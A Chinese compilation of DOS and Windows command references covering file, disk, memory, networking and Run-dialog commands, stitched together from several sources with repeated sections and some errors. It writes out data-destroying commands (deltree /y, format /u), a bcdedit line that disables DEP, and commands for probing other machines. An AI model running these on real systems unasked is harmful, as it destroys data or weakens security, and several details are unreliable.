常用的命令 
cd 改变当前目录

cls 清屏

copy 拷贝文件

del 删除文件

deltree 删除目录树

dir 列文件名

diskcopy 复制磁盘

edit 文本编辑

format 格式化磁盘

md 建立子目录

mem 查看内存状况

more 分屏显示

move 移动文件、改目录名

rd 删除目录

ren 改变文件名

type 显示文件内容

sys 制作DOS系统盘

xcopy 拷贝目录与文件
attrib 设置文件属性

chkdsk 检查磁盘

date 显示及修改日期

defrag 磁盘碎片整理

doskey 重新调用DOS命令

emm386 扩展内存管理

fdisk 硬盘分区

help 帮助

label 设置卷标号

lh 将程序装入高端内存

memmaker内存优化管理

msd 系统检测

path 设置搜寻目录

prempt 设置提示符

restore 恢复备份文件

time 显示及修改时间

scandisk检测、修理磁盘

set 设置环境变量

smartdrv设置磁盘加速器

undelete恢复被删的文件
  
append 设置非执行文件路径

debug 随机调试程序

diskcomp磁盘比较

expand 还原DOS文件

fasthelp快速显示帮助信息

fc 文件比较

interink启动服务器

intersvr启动客户机

qbasic Basic集成环境

setver 设置版本

share 文件共享

subst 路径替换 

tree 列目录树

unformat恢复已格式化的磁盘

vsafe 防病毒

ver 显示DOS版本号

vol 显示磁盘卷标号

ctty 改变控制设备


dos命令

dos下各种常见命令索引

▲ dir

▲ attrib

▲ cd

▲ copy

▲ xcopy

▲ del

▲ undelete

▲ deltree

▲ dos=high

▲ doskey

▲ emm386.exe

▲ fc

▲ format

▲ unformat

▲ interlnk

▲ intersvr

▲ memmaker

▲ memitem等

▲ mscdex

▲ msd

▲ prompt

▲ ramdrive

▲ subst

▲ mem

▲ "> < >> <<"工具

▲ move

▲ append

▲ call

▲ defrag

▲ device

一、DIR 命令的格式：

dir [D:][PATH][NAME][[/A][:attrib]][/o:[sorted][/s][/b][/l][/c[h]

(1)dir /a:attrib 缺省包含所有文件(系统文件.隐含文件)

attrib[:][h/-h]只显示隐含文件或非隐含文件.

[r/-r]只显示只读文件或非只读文件

[s/-s]只显示系统文件或非系统文件

[a/-a]只显示要归档文件或非归档文件

(2)/o[:]sorted:缺省完全按字母顺序,子目录显示在文件之前

/o[n/-n]:按字母顺序或按文件名顺序/反向显示

[e/-e]:按扩展名字母顺序/反向显示

[d/-d]:按时间顺序/反向显示

[s/-s]:按大小从大到小或/反向显示

[g/-g]:按子目录先于文件或文件先于子目录

(3)/s 参数:对当前目录及其子目录中所有文件进行列表

列名:dir /s/a/o:n c:\>PRN

将c盘上的所有子目录和文件按隶属关系并根据子目录和文件字母顺序打印输出

(4)/B 参数:将只显示文件名与扩展名

(5)/L 参数:将全部用小写字母对文件或子目录进行列表

训练:

dir /a 列当前目录所有文件(含隐含及系统文件)

dir /ah 列隐含文件(包含子目录(隐含的) dir /a-h

dir /as 列系统文件 dir /a-s

dir /ad 列子目录 dir /a-d

dir /o 按字母顺序

dir /B 只显示文件名与扩展名

二、attrib [+r|-r] [+a|-a] [+s|-s] [+h|-h] [d: ] [name] [/s]

缺省 attrib name 显示文件的(文件)属性

attrib io.sys (或子目录)

shr c:\ io.sys 指定为系统(s) 隐含(h) 只读(r)文件

也可以attrib *.sys 显示扩展名为sys的文件属性

参数 [+r|-r] 将文件属性设置或解除 只读属性

[+a|-a] 将文件属性设置或解除 归档属性

[+h|-h] 将文件属性设置或解除 隐含属性 (尤其对子目录也起作用)

/s 参数 将当前及当前子目录下的所有文件均起作用

可以用来查找文件

例子:

attrib news86 列news86的文档属性

attrib +r report.txt 设置为只读 attrib -s -h record.txt

attrib +a a:*.*

attrib -a a:*.bak

xcopy a: b: /a 将A盘上的所有标志为"归档"属性的文件拷到B盘

xcopy a: b: /m 将A盘上的所有文件拷到B盘后并移去归档属性

三、cd 介绍: cd...返回上二级目录 "."代表当前目录 "."代表父目录

cd ..\..返回到上级目录的父目录(祖目录)

cd A:\ 将A盘的当前目录改为根目录

cd A:\xx 将A盘的当前目录改为子目录xx下

cd ..\98 先返回父目录,再进入父目录下的98子目录

cd ..返回到父目录

cd\98 进入根目录下的98子目录

四、copy [/y][/-y][/v][ /B]

copy /y 不加提示,对所有文件加以覆盖

/-y 加以提示,对所有文件 (yes或no提问 )

/v 拷贝以后加以校验

/B 按二进制进行显示

copy w1.wps con/b 可以将wps文件在屏幕上显示,而不必进入wps状态

copy ..\98 将父目录下的98子目录下的所有文件全拷到当前子目录

copy .\97 当当前目录下的97子目录下文件全部拷到当前目录

copy . c:\ 将当前目录下的所有文件拷到c盘根目录

. 意味着 *.* 文件

copy nul a.abc 将a.abc 文件清空(文件长度改为0)

copy 文件名+con 向文本文件中追加命令或内容

copy con 文件名 创建文本文件(F6存盘退出)

copy con prn 检测打印机的开关

五、xcopy命令

xcopy [source] [d:date] [/p] [/s] [/e] [/v] [/y]

xcopy [d:date] xcopy a:b:\ /d:08/18/98/s/v 拷贝98.08.18年后的文件

xcopy [/p] 提示创建子目录

xcopy [/s] 连带子目录一起拷贝. 注意:若目标盘上不存在此子目录,而在目标

盘的结束符又不以"\"为结束,则将提示:

does destination specify a file name or directory name on the target

[f=file,d=directory]?

在目标盘上创建文件[按下]还是创建子目录[按下d] ?应选择d键

xcopy[/v] 带较验

*:(1) xcopy 不拷贝系统和隐含文件,应先予以修改属性再拷贝

xcopy [/y] 覆盖时是否有提示, /y 不带提示

若省略目标盘或子目录名,则拷贝到当前目录下

六、 del /p

加/p 可以在删除前是否提示

如del后加子目录名,则将子目录下所有文件(隐含.系统.只读文件除外)全删除,

加/p则可以确认.

七、undelete [name] /au

不加提示地将所有满足条件的文件恢复(能够恢复的),并将首字母置成"#",若已

存在,则按"# % & 0 1 2-9 a-z"顺序加上.

如:undelete *.dbf/au 将扩展名为"dbf"的文件全恢复,并以"#"开头,作为文件

名, /list 仅列出可恢复的文件,而不恢复

undelete /load 将undelete装入内存

/unload 将undelete卸出内存

/s[drive]对指定驱动器进行监测管理

undelete/sc

将 undelete驻留内存,?并创建一个隐含的sentry 子目录对c盘删除的文件进行

管理 undelete/ds 恢复

相应恢复命令可以用undelete即可完整恢复出文件名(非常完整)

最常用undelete *.*

deltree /y [drive:path]

deltree 删除子目录及文件,尽管有些文件是系统文件或隐含文件

它可以带有通配符,带有通配符时,它将删除符合条件的文件及子目录

如:?undelete *.dbf/au 将扩展名为"dbf"的文件全恢复,并以"#"开头作为文件

名.

/list 仅列出可恢复的文件,而不作恢复操作.

undelete/load 将undelete 装入内存.

/unload将undelete 卸出内存.

/s[drive] 对指定的驱动器进行监视管理.

undelete/sc 将undelete 驻留内存,并创建一个隐含的sentry子目录对C盘删除

的文件进行管理.相应恢复命令可以用undelete/ds 即可完整恢复出文件名(很完善).

最常用的是undelete *.*

八、deltree /y [drive:path]

deltree 删除子目录及文件,尽管有些文件是系统或隐含的.

它可以带有通配符,这时它将删除符合条件的文件或子目录.

如:存在L1文件,L2子目录,L3文件,L4子目录

deltree L*.* 将删除以上所有的文件和子目录,但在删除前加以确认,若不删除,

可以输入"N".

/y 参数是在删除时不加以确认就进行操作的.

它删除的文件可以用undelete恢复,?但不能恢复子目录及其下的文件,可以用特

殊工具.如NORTON 8.0 等.

若提前使用了undelete/s,?则可以在sentry子目录下找到完整的文件,但名已经

改变了.

九、dos=high[|low[umb|noumb]]

dos=high,umb 则dos将自身装入高端内存(high)并能管理上位内存(umb).

noumb 则不管理上位内存.

在写入dos=high及umb 前应装入device=himem.sys

为了将程序或驱动程序装入上位内存,必须使用dos=umb,可省出大部分常规内存.

可以在config.sys的任何位置写上dos=high,umb

若显示hma not avoiable 或 load down low 则表明不能使用高端内存.

十、doskey 记录以前敲过的dos命令,可以用F7来显示,用"↑↓"来选择,用F9来输入

选择的命令号.

doskey/restall 重新装入一次,以前的命令行撤消.

doskey/history 显示内存中所有的命令,可以">"显示到其它文件中,缩写"/H".

doskey dir=cls 则击入dir等同于cls一样.

doskey/macros 可显示所有的宏定义,可使用">"重定义到文件中,可缩写"/M".

doskey dir= 可撤消对dir 的宏定义.

doskey p=dir$tdir*.exe/p$tdir c:\t$tdir c:\t$*

$t为命令的区分符,而$*为命令的结束符

doskey/insert(overstrike)?在重新输入命令时,对旧命令的修改是插入还是覆

盖状态(默认).

十一、emm386.exe

提供对扩展内存的管理,使应用程序象使用常规内存一样能够使用它.

常见的用法是 在config.sys 中

device=c:\dos\himem.sys

device=c:\dos\emm386.exe ram

d=64 将DMA 内存数量设置为64K

noems 提供对上位内存的访问,但不提供对扩展内存的访问.

应注意的是在windows中最好不要用它,因为windows本身有对扩展内存进行管理

的程序.应采用windows中的管理器.

十二、fc 命令 fc/b dt.dat dt2.dat>b (作二进制代码比较)

比较两个文件,一般用作存取进度,修改游戏存储文件用.

实际代码位置应加上0100 如:0000 05E4:00 67

实际用debug -e 修改时应加上0100 即 0000 06E4:00 67

后面加上重定向文件">P" 可以将比较结果输出到p文件中.

十三、format /q /u /s /n:sectors /f:size /c

/q参数:快速格式化,仅扫描文件分配表和根目录区,仅对格式化过的磁盘有效.

使用时应确保格式化过后没有增加新的坏道.

/u参数:无条件格式化,并且不保存原来盘上的信息,可以防止"unformat".

/s参数:格式化为系统盘,也可以使用"sys"命令.

/f:size size 可以为160 180 320 360 720 1200 1440 2800

/n:sector n可以为1 格式为单面盘,容量为160k 180k

可以为4 可以在5寸高密驱动器上格式化360k磁盘

可以为8 可以在5寸高密驱动器上进行8个扇区的格式化.

/c 重新测试坏扇区,缺省时如果一个扇区标记为"坏",以后格式时就不在从新测

试,仅作标记,使用"/C"时可以从新测试.

十四、unformat 命令

对用format 格式过,且未用"/u"参数的命令起作用,用它可以来重新修复已经损

坏的硬盘分区表,但对网络盘不起作用.

unformat drive:[/l][/test][/p]

/l 显示每一个被unformat发现的文件和子目录,如果没有这个开关,只显示那些

破碎的文件和子目录,可以用ctrl+s 暂停,按任意键继续.

/test 仅作一个测试,不作实际的修复工作,作模拟过程.

/p 一边测试一边打印.

注:这种方法不能保证修复所有的文件,尤其是格式化后又添加过数据的磁盘.

恢复后的文件依次存放在subdir1....2....3等子目录中.

十五、interlnk 语法 interlnk g=e ,它可以通过串口或并口在两机间进行通讯.

将服务器端上的e驱动器映射为客户端的g驱动器,以后对客户端而言,所有对g的

操作都意味着对服务器的访问,取消映射的办法为interlnk g=

单独输入interlnk 则显示所有的映射情况.

注意:interlnk 必须在装入interlnk.exe 设备驱动程序才可以使用.

所用的驱动器符号与config.?sys中lastdrv.exe设置的数目有关.可以作一个一

端为25针,另一端为9针的串行线实现,具体接线方式如下:

5 - 7 2 - 15

3 - 2 3 - 13

7 - 4 4 - 12

6 - 6 5 - 10

3 - 3 6 - 11

8 - 5 15 - 2

4 - 20 13 - 3

9针 25针 12 - 4

10 - 5

11 - 6

25 - 25

25针 25针

十六、interlnk.exe 与intersvr.exe

interlnk.exe 重新定向对于客户驱动器或打印接口的请求到另外的服务器驱动

器或打印机.

语法:config.sys 中加入:

device=c:\dos\interlnk.exe [drive:n][/noprinter][com][lpt]

十七、memmaker[/b][/batch][session][/swap:drive]

使用memmaker能够优化内存配置,?并将配置写入autoexec.bat和config.sys中.

在这一过程中,需要重新启动几次机器.

十八、memitem memcolor memdefault submenu 菜单选项include

autoexec.bat 中如下: config.sys中如下:

path c:\dos;c:\ucdos [menu]

doskey menucolor=15,1(前景色15,背景色1)

\mouse\mouse menuitem=base_config,this is a base

goto %config% ->选择项 menuitem=cced_config,this is a cced

选项 提示

:base_config menudefault=base_config,5

goto exit ->跳出 缺省为base_config,延迟时间5秒

:cced_config [common]

c:\dos\smartdrv.exe /l device=c:\dos\himem.sys

goto exit 各项都包含的共同部分

:exit ->结束 [base_config]

device=c:\dos\emm386.exe ram

dos=high,umb

[cced_config]

device=c:\dos\smartdrv.exe/double_buffer

include=base_config 包含base_config设置

可以根据计算机的在不同情况下的配置要求来选择.

十九、mscdex.exe 提供对光驱进行读写的程序

mscdex/d:drive [/D:drive][/e][/k][/s][/l:letter]

典型:config.sys 中device=c:\cdrom\cdrom.sys /d:mscd000

autoexec.bat中 c:\dos\mscdex /d:mscd000 /l:g

配置了一个光驱,符号为g

参数/d:drive1为光驱身份号,须与config.sys中的符号一致,可有多个

/d:mscd000 /d:mscd001

/e:使用扩展内存装入光驱驱动程序.

/s:使光驱在ms_net或windows是否设置为共享光驱

/V是否在加载时显示内存.

/L:letter 分配给光驱的盘符

/m:number 指定缓冲器的数目

应该注意的是:?如果用smartdrv.exe 加速对光驱的读写能力,应该在autoexec.

bat中将mscdex.?exe 写在smartdrv.exe 之前,smartdrv.exe的使用可大幅提高

对驱动器的读写能力.

二十、msd的使用

使用msd 可以整体检查计算机配置及系统信息

包括:?驱动器参数,计算机cpu参数,内存大小参数,显示器类型,串.并口情况,以

及各个IRQ占用情况,据此可以分析新增设备是否与原来设备有冲突.

同时也可以通过分析内存驻留程序,判断内存中是否有病毒,有则标为"???".

二十一、prompt dos提示符

$q 等于号 $t 当前时间 $d 当前日期 $p 当前驱动器符号

$$ $号提示 $n当前驱动器 $g 大于号 $l小于号 $b 显示"|"管道号

$h 隐去提示符 $E显示"<-"号

对于其它文字,则直接显示文本本身prompt ljw,则显示为ljw提示符

prompt 则仅显示当前驱动器号及大于号.

二十二、ramdrive.sys 使用内存当做虚拟盘来使用

应注意,所有数据都存在于内存中,应及时将其存到硬盘中,否则掉电后或者死机

后将丢失全部数据,优点是运行速度快,但不能在windows中使用.

示例:config.sys: device=c:\dos\ramdrive.sys /size[/e|a]

size为以k为单位的字节数,即建立的虚拟盘的大小.

/e或/a 都是使用扩展内存来建立虚拟盘,?加参数的前提是必须先加载内存管理

器himem.sys及emm386.exe.

二十三、subst 将一个驱动器与一个子目录联接

如:将对A:\l1\l2 子目录的请求映射为S盘,则输入

subst s: a:\l1\l2 即可

这样使用dir s:?等命令则显示的是a:\l1\l2子目录下的内容,其它copy del 一样

可以用subst s: d 来取消这种映射.

可以用subst 来显示各种联接情况

注意:?可以采用subst a: c:a 来建立一个对于A的读写盘.对于某些安装软件

来说,?必须使用A盘来安装,就可以使用先将所要安装的软件全部拷贝到C:a子

目录中,然后输入subst a: c:a,再转到A:,就可以进行软件的安装了.

二十四、mem /c /m /p /d 常规内存显示程序

/c显示所有内存驻留程序的占用情况,分为conventional常规内存和uppermemory

高端内存占用,并显示总的占用情况(常规 高端 保留 扩展内存)

/p分页显示,页间暂停

/m后加模块名 如:/m msdos 显示dos系统内存的占用.

/d对常规 高端 保留 扩展内存加以详细例表说明

通过分析,可以看出内存占用是否合理,以及各种程序是否正常加载,从而在此基

础上使用内存优化工具memmaker进行各种管理,同时又可以分析出一些程序死机

的原因,若有的地方显示"???",则可以断定内存中有病毒的存在,有利于发现及消灭.

二十五、各种管道工具的使用"> < >> <<"

将各种命令造成的输出或所需要的输入重新定向

如:dir *.bat /b>p 可以将dir *.bat 例出的文件名输出到p文件中.

time<p>>p.bat

p文件中仅存在一个回车符,则可以将时间追加进p.bat文件中

"> >>" 是将命令产生的输出重新定向,比如到文件或打印机中.

>>产生的内容将追加进文件中,>则将原文件内容覆盖.

"< <<" 是将命令所需要输入的内容重新定向.

如:time<p 在批中可以是时间代码或回车符,可以以此改变时间.

需要说明的是 "prn "为打印机, "null"为空设备

con 为显示器

type p.bat>prn 可将p.bat打印出来.

copy null p 可将p文件删除掉

copy con p 可以在屏幕上编辑p文件,F6可以存盘退出

type p>pp 完成p文件到pp 的复制

type p|more 可在屏满时暂停显示

二十六、move 命令

move [y/-y] filename1 filename2

将文件1移动到文件2处

如:move c:\dos\*.* c:\cced

将dos子目录下的所有文件全部移动到cced 子目录下

/y|-y参数在目标目录不存在需要创建时,是否出现提示

可以使用该命令修改子目录名称,如 move dos cced

将dos目录名改为cced

二十七、append 指定一些特殊数据文件的存放位置,如user.dat pe2.pro等一些非*.

exe *.com *.bat 文件

格式:append [:]终止以前存在的指定目录 append 显示指定情况

append [path] append c:\user 等

二十八、

call 在一个批处理命令中调用另外一个批处理文件

(1)不终止现有文件的运行,执行完掉用程序后立即返回.

(2)被调用批处理命令必须以bat 为扩展名

(3)调用批处理文件时,可以加上参数(%1-%9)以及环境变量如%baud%

(4)不能使用管道工具及重定向工具

二十九、device devicehigh loadhigh

device 将指定的设备驱动程序装入内存中

devicehigh将指定的设备驱动程序装入高端内存中

loadhigh 将指定的设备驱动程序装入高端内存中

三十、defrag 优化磁盘

legend(传奇) optimize(优化) elapse(逝去) fragment(碎片)

该命令执行对指定的盘进行优化处理(包括检查文件分配表,各文件状态,纠正错

误),在执行时,可按照文件名大小,时间,扩展名对文件进行排序. 




关机：
开始--运行--键入“shutdown -s -t 00”

重启：
开始--运行--键入“shutdown -r -t 00”
依次按 win + u +r 重起
依次按 win + u +s 关机


netstat -ano|findstr "443"         //搜索443端口占用情况，并找到进程ID

tasklist|findstr "720"                     //查找PID为720对应的进程名


Net Send 

　　作 用：向网络的其他用户、计算机或通信名发送消息。 
　　命令格式：Net send {name | * | /domain[:name] | /users} message 
　　有关参数说明：

　　·name要接收发送消息的用户名、计算机名或通信名 
　　·* 将消息发送到组中所有名称 
　　·/domain[:name]将消息发送到计算机域中的所有名称 
　　·/users将消息发送到与服务器连接的所有用户
　　·message作为消息发送的文本 

　　例如：Net send /users server will shutdown in 10 minutes.给所有连接到服务器的用户发送消息


net   send   targetip   message


1.最基本，最常用的，测试物理网络的 
ping 192.168.10.88 －t ，参数－t是等待用户去中断测试 
2.查看DNS、IP、Mac等 
A.Win98：winipcfg 
B.Win2000以上：Ipconfig/all 

C.NSLOOKUP：如查看河北的DNS 
C:\>nslookup  查看dns
Default Server: ns.hesjptt.net.cn 
Address: 202.99.160.68 

>server 202.99.41.2 则将DNS改为了41.2 
> pop.pcpop.com 

Server: ns.hesjptt.net.cn 
Address: 202.99.160.68 

Non-authoritative answer: 
Name: pop.pcpop.com 
Address: 202.99.160.212 

3.网络信使 
Net send 计算机名/IP|* (广播) 传送内容，注意不能跨网段 
net stop messenger 停止信使服务，也可以在面板－服务修改 
net start messenger 开始信使服务 

4.探测对方对方计算机名，所在的组、域及当前用户名 
ping －a IP －t ，只显示NetBios名 
nbtstat -a 192.168.10.146 比较全的 

5.netstat -a 显示出你的计算机当前所开放的所有端口 
netstat -s -e 比较详细的显示你的网络资料，包括TCP、UDP、ICMP 和 IP的统计等 

6.探测arp绑定（动态和静态）列表，显示所有连接了我的计算机，显示对方IP和MAC地址 
arp -a 

7.在代理服务器端 
捆绑IP和MAC地址，解决局域网内盗用IP： 
ARP －s 192.168.10.59 00－50－ff－6c－08－75 
解除网卡的IP与MAC地址的绑定： 
arp -d 网卡IP 

8.在网络邻居上隐藏你的计算机 
net config server /hidden:yes 
net config server /hidden:no 则为开启 

9.几个net命令 
A.显示当前工作组服务器列表 net view，当不带选项使用本命令时，它就会显示当前域或网络上的计算机上的列表。 
比如：查看这个IP上的共享资源，就可以 
C:\>net view 192.168.10.8 
在 192.168.10.8 的共享资源 
资源共享名 类型 用途 注释 
-------------------------------------- 
网站服务 Disk 
命令成功完成。 

B.查看计算机上的用户帐号列表 net user 
C.查看网络链接 net use 
例如：net use z: \\192.168.10.8\movie 将这个IP的movie共享目录映射为本地的Z盘 

D.记录链接 net session 
例如： 
C:\>net session 
计算机 用户名 客户类型 打开空闲时间 
------------------------------------------------------------------------------- 
\\192.168.10.110 ROME Windows 2000 2195 0 00:03:12 

\\192.168.10.51 ROME Windows 2000 2195 0 00:00:39 
命令成功完成。 

10.路由跟踪命令 
A.tracert pop.pcpop.com 
B.pathping pop.pcpop.com 除了显示路由外，还提供325S的分析，计算丢失包的％ 

11.关于共享安全的几个命令 
A.查看你机器的共享资源 net share 
B.手工删除共享 
net share c$ /d 
net share d$ /d 
net share ipc$ /d 
net share admin$ /d 
注意$后有空格。 
C.增加一个共享： 
c:\net share mymovie=e:\downloads\movie /users:1 
mymovie 共享成功。 
同时限制链接用户数为1人。 

12.在DOS行下设置静态IP 
A.设置静态IP 
CMD 
netsh 
netsh>int 
interface>ip 
interface ip>set add "本地链接" static IP地址 mask gateway 
B.查看IP设置 
interface ip>show address




sndrec32－－－－－－－录音机 


Nslookup－－－－－－－IP地址侦测器

explorer－－－－－－－打开资源管理器

logoff－－－－－－－－－注销命令

tsshutdn－－－－－－－60秒倒计时关机命令

lusrmgr.msc－－－－本机用户和组

services.msc－－－本地服务设置

oobe/msoobe /a－－－－检查XP是否激活

notepad－－－－－－－－打开记事本

cleanmgr－－－－－－－**整理

net start messenger－－－－开始信使服务

compmgmt.msc－－－计算机管理

net stop messenger－－－－－停止信使服务

conf－－－－－－－－－－－启动 netmeeting

dvdplay－－－－－－－－DVD播放器

charmap－－－－－－－－启动字符映射表

diskmgmt.msc－－－磁盘管理实用程序

calc－－－－－－－－－－－启动计算器

dfrg.msc－－－－－－－磁盘碎片整理程序

chkdsk.exe－－－－－Chkdsk磁盘检查

devmgmt.msc－－－ 设备管理器

regsvr32 /u *.dll－－－－停止dll文件运行

drwtsn32－－－－－－ 系统医生

rononce －p －－－－15秒关机

dxdiag－－－－－－－－－检查DirectX信息

regedt32－－－－－－－注册表编辑器

Msconfig.exe－－－系统配置实用程序

rsop.msc－－－－－－－组策略结果集

mem.exe－－－－－－－－显示内存使用情况

regedit.exe－－－－注册表

winchat－－－－－－－－XP自带局域网聊天

progman－－－－－－－－程序管理器

winmsd－－－－－－－－－系统信息

perfmon.msc－－－－计算机性能监测程序

winver－－－－－－－－－检查Windows版本

sfc /scannow－－－－－扫描错误并复原

taskmgr－－－－－任务管理器（2000／xp／2003）

wmimgmt.msc－－－－打开windows管理体系结构(WMI) 

wupdmgr－－－－－－－－windows更新程序 

w脚本－－－－－－－－windows脚本宿主设置 

write－－－－－－－－－－写字板 

winmsd－－－－－－－－－系统信息 

wiaacmgr－－－－－－－扫描仪和照相机向导 

winchat－－－－－－－－XP自带局域网聊天 

mem.exe－－－－－－－－显示内存使用情况 

Msconfig.exe－－－系统配置实用程序 

mplayer2－－－－－－－简易widnows media player 

mspaint－－－－－－－－画图板 

mstsc－－－－－－－－－－远程桌面连接 

mplayer2－－－－－－－媒体播放机 

magnify－－－－－－－－放大镜实用程序 

mmc－－－－－－－－－－－－打开控制台 

mobsync－－－－－－－－同步命令 

dxdiag－－－－－－－－－检查DirectX信息 
drwtsn32－－－－－－ 系统医生 

devmgmt.msc－－－ 设备管理器 

dfrg.msc－－－－－－－磁盘碎片整理程序 

diskmgmt.msc－－－磁盘管理实用程序 

dcomcnfg－－－－－－－打开系统组件服务 

ddeshare－－－－－－－打开DDE共享设置 

dvdplay－－－－－－－－DVD播放器 

net stop messenger－－－－－停止信使服务 

net start messenger－－－－开始信使服务 

notepad－－－－－－－－打开记事本 

nslookup－－－－－－－网络管理的工具向导 

ntbackup－－－－－－－系统备份和还原 

narrator－－－－－－－屏幕“讲述人” 

ntmsmgr.msc－－－－移动存储管理器 

ntmsoprq.msc－－－移动存储管理员*作请求 

netstat －an－－－－(TC)命令检查接口 

syncapp－－－－－－－－创建一个公文包 

sysedit－－－－－－－－系统配置编辑器 

sigverif－－－－－－－文件签名验证程序 

sndrec32－－－－－－－录音机 

shrpubw－－－－－－－－创建共享文件夹 

secpol.msc－－－－－本地安全策略 

syskey－－－－－－－－－系统加密，一旦加密就不能解开，保护windows xp系统的双重密码 

services.msc－－－本地服务设置 

Sndvol32－－－－－－－音量控制程序 

sfc.exe－－－－－－－－系统文件检查器 

sfc /scannow－－－windows文件保护 

tsshutdn－－－－－－－60秒倒计时关机命令 

tourstart－－－－－－xp简介（安装完成后出现的漫游xp程序） 

taskmgr－－－－－－－－任务管理器 

eventvwr－－－－－－－事件查看器 

eudcedit－－－－－－－造字程序 

explorer－－－－－－－打开资源管理器 

packager－－－－－－－对象包装程序 

perfmon.msc－－－－计算机性能监测程序 

progman－－－－－－－－程序管理器 

regedit.exe－－－－注册表 

rsop.msc－－－－－－－组策略结果集 

regedt32－－－－－－－注册表编辑器 

rononce －p －－－－15秒关机 

regsvr32 /u *.dll－－－－停止dll文件运行 

regsvr32 /u zipfldr.dll－－－－－－取消ZIP支持 

cmd.exe－－－－－－－－CMD命令提示符 

chkdsk.exe－－－－－Chkdsk磁盘检查 

certmgr.msc－－－－证书管理实用程序 

calc－－－－－－－－－－－启动计算器 

charmap－－－－－－－－启动字符映射表 

cliconfg－－－－－－－SQL SERVER 客户端网络实用程序 

Clipbrd－－－－－－－－剪贴板查看器 

conf－－－－－－－－－－－启动netmeeting 

compmgmt.msc－－－计算机管理 

cleanmgr－－－－－－－**整理 

ciadv.msc－－－－－－索引服务程序 

osk－－－－－－－－－－－－打开屏幕键盘 

odbcad32－－－－－－－ODBC数据源管理器 

oobe/msoobe /a－－－－检查XP是否激活 

lusrmgr.msc－－－－本机用户和组 

logoff－－－－－－－－－注销命令 

iexpress－－－－－－－木马捆绑工具，系统自带 

Nslookup－－－－－－－IP地址侦测器 

fsmgmt.msc－－－－－共享文件夹管理器 

utilman－－－－－－－－辅助工具管理器 

gpedit.msc－－－－－组策略


解决QC问题dos命令
bcdedit   /set  {current}  nx  AlwaysOff



是的，用echo至少要输入一个空行进去
创建空文件方法很多，可以用任何在命令行执行后不会显示信息的命令加重定向，比如cd.>a.txt
c:>a.txt
type nul>a.txt等
注意它会同时执行了前面的命令，所以cd.>a.txt是一个不执行别的操作时的较佳选择
通常批处理总会在前面用@echo off
所以@echo off>a.txt也是个不错选择
此外还可以用 copy nul a.txt


copy con 1.txt
你说的echo是批处理用的 


echo. >"C:\Program Files\a.txt"

title>A.txt

开始-运行-shutdown -s -t 10 回车 10毫秒后自动关机。 
有两个前提条件： 
1、你用的是XP以上系统 
2、请确认%windir%\system32\shutdown.exe这个文件存在。 


纯DOS没有命令控制关机，只能使用Ctrl+Alt+Del重启或按机箱上的关机键，纯DOS是装入到内存中运行的，只要确认DOS程序都退出，关机是不影响磁盘的。



DOS命令大全
一）MD——建立子目录  
1．功能：创建新的子目录 
2．类型：内部命令 
3．格式：MD[盘符：][路径名]〈子目录名〉 
4．使用说明： 
（1）“盘符”：指定要建立子目录的磁盘驱动器字母，若省略，则为当前驱动器； 
（2）“路径名”：要建立的子目录的上级目录名，若缺省则建在当前目录下。 
例：（1）在C盘的根目录下创建名为FOX的子目录；（2）在FOX子目录下再创建USER子目录。 
C：、＞MD FOX （在当前驱动器C盘下创建子目录FOX） 
C：、＞MD FOX 、USER （在FOX 子目录下再创建USER子目录） 
（二）CD——改变当前目录 
1．功能：显示当前目录 
2．类型：内部命令 
3．格式：CD[盘符：][路径名][子目录名] 
4．使用说明： 
（1）如果省略路径和子目录名则显示当前目录； 
（2）如采用“CD、”格式，则退回到根目录； 
（3）如采用“CD.。”格式则退回到上一级目录。 
例：（1）进入到USER子目录；（2）从USER子目录退回到子目录；（3）返回到根目录。 
C:、＞CD FOX 、USER（进入FOX子目录下的USER子目录） 
C:、FOX、USER＞CD.。 （退回上一级根目录） 
C：、FOX＞CD、 （返回到根目录） 
C：、＞ 
（三）RD——删除子目录命令 
1．功能：从指定的磁盘删除了目录。 
2．类型：内部命令 
3．格式：RD[盘符：][路径名][子目录名] 
4．使用说明： 
（1）子目录在删除前必须是空的，也就是说需要先进入该子目录，使用DEL（删除文件的命令）将其子目录下的文件删空，然后再退回到上一级目录，用RD命令删除该了目录本身； 
（2）不能删除根目录和当前目录。 
例：要求把C盘FOX子目录下的USER子目录删除，操作如下： 
第一步：先将USER子目录下的文件删空； 
C、＞DEL C：、FOX、USER、*。* 
第二步，删除USER子目录。 
C、＞RD C：、FOX、USER 
（四）DIR——显示磁盘目录命令 
1．功能：显示磁盘目录的内容。 
2．类型：内部命令 
3．格式：DIR [盘符][路径]

[/W] 
4．
使用说明：/P的使用；当欲查看的目录太多，无法在一屏显示完屏幕会一直往上卷，不容易看清，加上/P参数后，屏幕上会分面一次显示23行的文件信息，然后暂停，并提示；Press
any key to continue 
/W的使用：加上/W只显示文件名，至于文件大小及建立的日期和时间则都省略。加上参数后，每行可以显示五个文件名。 
PATH——路径设置命令 
1．功能：设备可执行文件的搜索路径，只对文件有效。 
2．类型：内部命令 
3．格式：PATH[盘符1]目录[路径名1]{[；盘符2：]，〈目录路径名2〉…} 
4．使用说明： 
（1）当运行一个可执行文件时，DOS会先在当前目录中搜索该文件，若找到则运行之；若找不到该文件，则根据PATH命令所设置的路径，顺序逐条地到目录中搜索该文件； 
（2）PATH命令中的路径，若有两条以上，各路径之间以一个分号“；”隔开； 
（3）PATH命令有三种使用方法： 
PATH[盘符1：][路径1][盘符2：][路径2]…（设定可执行文件的搜索路径）  PATH：（取消所有路径） 
PATH：（显示目前所设的路径） 
（六）TREE——显示磁盘目录结构命令 
1．功能：显示指定驱动器上所有目录路径和这些目录下的所有文件名。 
2．类型：外部命令 
3．格式：TREE[盘符：][/F][》PRN] 
4．使用说明： 
（1）使用/F参数时显示所有目录及目录下的所有文件，省略时，只显示目录，不显示目录下的文件； 
（2）选用＞PRN参数时，则把所列目录及目录中的文件名打印输出。 
（七）DELTREE——删除整个目录命令 
1．功能：将整个目录及其下属子目录和文件删除。 
2．类型：外部命令 
3．格式：DELTREE[盘符：]〈路径名〉 
4．使用说明：该命令可以一步就将目录及其下的所有文件、子目录、更下层的子目录一并删除，而且不管文件的属性为隐藏、系统或只读，只要该文件位于删除的目录之下，DELTREE都一视同仁，照删不误。使用时务必小心！！！ 
五、磁盘操作类命令 
（一）formAT——磁盘格式化命令 
1．功能：对磁盘进行格式化，划分磁道和扇区；同时检查出整个磁盘上有无带缺陷的磁道，对坏道加注标记；建立目录区和文件分配表，使磁盘作好接收DOS的准备。 
2．类型：外部命令 
3．格式：formAT〈盘符：〉[/S][/4][/Q] 
4．使用说明： 
（1）命令后的盘符不可缺省，若对硬盘进行格式化，则会如下列提示：WARNING:ALL DATA ON NON
——REMOVABLE DISK 
